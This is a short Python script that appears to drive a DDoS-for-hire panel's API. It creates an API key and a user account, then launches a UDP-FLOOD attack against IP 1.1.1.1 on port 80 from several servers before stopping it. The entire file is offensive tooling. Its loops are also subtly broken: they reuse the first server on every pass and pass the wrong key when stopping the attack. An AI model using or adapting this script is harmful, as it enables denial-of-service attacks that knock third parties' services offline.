from modules.api import * 


server = getServers()[0]
admin_key = getJsonFromObj("Api","Administrator Key")
attack_key = getJsonFromObj("Api","Attack key")
                                       
# Add API Key 

api_key = addApiKey(server, admin_key)
print(f"Created api key : {api_key}") # outputs api key

# Create account 

account = createAccount(server, admin_key, "test_username") 

username = account[0]
password = account[1]


print(f"Created account {username}:{password}")

# Send attack

for i in getServers():
    attack = sendAttack(server, attack_key, "1.1.1.1", 80, 10, "UDP-FLOOD") # Server IP, API key, IP, Port, Time, Method
    if attack:
        print(f"Sent attack using server {i}")
    else:
        print(f"Failed to send attack using server {i}")


# Stop attacks

for i in getServers():
    attack_stopped = stopAttack(server, api_key, "1.1.1.1") # Api key, IP
    if attack_stopped:
        print(f"Server {i} stopped its attack")
    else:
        print(f"Server {i} failed to stop attack")
